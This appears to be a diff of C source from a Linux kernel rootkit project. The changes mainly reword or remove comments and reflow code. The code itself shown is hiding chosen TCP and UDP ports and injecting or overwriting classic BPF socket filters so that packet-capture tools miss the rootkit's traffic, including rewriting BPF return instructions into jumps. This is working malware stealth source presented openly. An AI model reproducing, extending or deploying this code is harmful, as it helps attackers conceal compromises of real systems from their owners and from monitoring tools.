@@ -6,7 +6,6 @@
 
 static const int ROOTI_MAX_BPF_PROGRAM_LEN = 255;
 
-// Indicates whether the given TCP port should be hidden by the rootkit
 bool rooti_should_hide_tcp_port(unsigned short port)
 {
     for (int i = 0; i < ROOTI_HIDDEN_TCP_PORTS_COUNT; i++) {
@@ -17,7 +16,6 @@ bool rooti_should_hide_tcp_port(unsigned short port)
     return false;
 }
 
-// Indicates whether the given UDP port should be hidden by the rootkit
 bool rooti_should_hide_udp_port(unsigned short port)
 {
     for (int i = 0; i < ROOTI_HIDDEN_UDP_PORTS_COUNT; i++) {
@@ -29,16 +27,17 @@ bool rooti_should_hide_udp_port(unsigned short port)
 }
 
 /*
-    Replace ret instructions with a positive return value (e.g instructions to 'accept' the packet) with a jump instruction
-    to the start of the user-defined BPF program (e.g 'program_offset').
+    Replace BPF ret instructions with a positive return value (e.g instructions to 'accept' the packet)
+    with a jump instruction to the start of the user-defined BPF program (e.g 'program_offset').
+    This way, the filter inserted by the user still applies.
 */
 static void rooti_replace_ret_instructions(struct sock_fprog_kern *fprog, loff_t program_offset)
 {
     loff_t jmp_offset;
     for (int i = 0; i < program_offset; i++) {
-        if (BPF_CLASS(fprog->filter[i].code) != BPF_RET || fprog->filter[i].k == 0) {
+        if (BPF_CLASS(fprog->filter[i].code) != BPF_RET || fprog->filter[i].k == 0)
             continue;
-        }
+
         jmp_offset = program_offset - (i + 1);
         fprog->filter[i].code = BPF_JMP | BPF_JA;
         fprog->filter[i].jt = 0;
@@ -49,9 +48,11 @@ static void rooti_replace_ret_instructions(struct sock_fprog_kern *fprog, loff_t
 
 /*
     Concatenate two source BPF filter programs into one by ANDing the filters they represent.
-    Saves the result into the filter 'dst_fprog' which is heap-allocated and should be freed later.
+    If at least one program rejects a packet then the result program would also reject the packet
+    and if both programs accept a packet then the result program would also accept it.
 */
-static int rooti_concat_filter_programs(struct sock_fprog_kern *src_fprog1, struct sock_fprog_kern *src_fprog2,
+static int rooti_concat_filter_programs(struct sock_fprog_kern *src_fprog1,
+                                        struct sock_fprog_kern *src_fprog2,
                                         struct sock_fprog_kern *dst_fprog)
 {    
     dst_fprog->len = src_fprog1->len + src_fprog2->len;
@@ -63,17 +64,13 @@ static int rooti_concat_filter_programs(struct sock_fprog_kern *src_fprog1, stru
 
     memcpy(dst_fprog->filter, src_fprog1->filter, bpf_classic_proglen(src_fprog1));
     memcpy(dst_fprog->filter + src_fprog1->len, src_fprog2->filter, bpf_classic_proglen(src_fprog2));
-
-    // Replace ret instructions of the 'accept path' with a jump to the start of the user program
     rooti_replace_ret_instructions(dst_fprog, src_fprog1->len);
+
     return 0;
 }
 
-/* 
-    Copies the userspace BPF filter program pointed to by 'fprog_ptr' into the parallel kernelspace structure.
-    The filter of the kernel structure is heap-allocated and should be freed later.
-*/
-static int rooti_copy_user_fprog(struct sock_fprog_kern *user_fprog_kernel, struct sock_fprog *user_fprog)
+static int rooti_copy_user_fprog(struct sock_fprog_kern *user_fprog_kernel,
+                                 struct sock_fprog *user_fprog)
 {
     size_t user_program_size = bpf_classic_proglen(user_fprog);
     int err;
@@ -94,7 +91,6 @@ static int rooti_copy_user_fprog(struct sock_fprog_kern *user_fprog_kernel, stru
     return 0;
 }
 
-// Attaches a new BPF filter program 'fprog' to the provided socket 'sock'
 static int rooti_attach_traffic_filter(struct sock *sock, struct sock_fprog_kern *fprog)
 {
     ROOTI_RESOLVE_FUNC_ADDR(__sk_attach_prog, -EINVAL, int, struct bpf_prog *, struct sock *);
@@ -118,8 +114,8 @@ static int rooti_attach_traffic_filter(struct sock *sock, struct sock_fprog_kern
 }
 
 /*
-    This function attaches additional cBPF filters (which are specifyed in the rootkit's configuration)
-    to the filters specified by the user. It effectively merges the user defined filter program with the rootkit's
+    Attaches additional cBPF filters (which are specifyed in the configuration) to the filters
+    specified by the user. It effectively merges the user defined filter program with the rootkit's
     filter program such that both filters must be satisfied in order to accept the packet.
 */
 int rooti_inject_traffic_filter(struct sock *sock, struct sock_fprog *user_fprog)
@@ -154,10 +150,6 @@ int rooti_inject_traffic_filter(struct sock *sock, struct sock_fprog *user_fprog
     return err;
 }
 
-/*
-    This function overwrites the BPF filter attached to 'sock' with the rootkit's
-    configured BPF filter program.
-*/
 int rooti_overwrite_traffic_filter(struct sock *sock)
 {
     struct sock_fprog_kern fprog = {
